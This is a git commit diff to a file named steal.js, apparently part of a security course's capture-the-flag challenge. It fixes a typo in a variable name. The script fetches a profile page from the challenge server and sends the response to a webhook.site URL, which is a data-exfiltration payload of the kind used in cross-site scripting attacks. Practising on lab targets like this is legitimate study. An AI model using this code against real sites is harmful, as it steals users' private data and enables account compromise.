1e7fdbca803877d42581fb23cc39eefdec945c3b
Dan1e1B <147431777+Dan1e1B@users.noreply.github.com>
2025-12-28 15:26:30 +0000

    Fix typo in variable name from 'respones' to 'response'

--- steal.js
+++ steal.js
@@ -3,7 +3,7 @@
 async function sendData(){
 
   try {
-    const respones = await fetch("http://ssof2526.challenges.cwte.me:12017/profile");
+    const response = await fetch("http://ssof2526.challenges.cwte.me:12017/profile");
     await fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/?data=" + encodeURIComponent(response));
     console.log("Sucess!");
   } catch(error) {
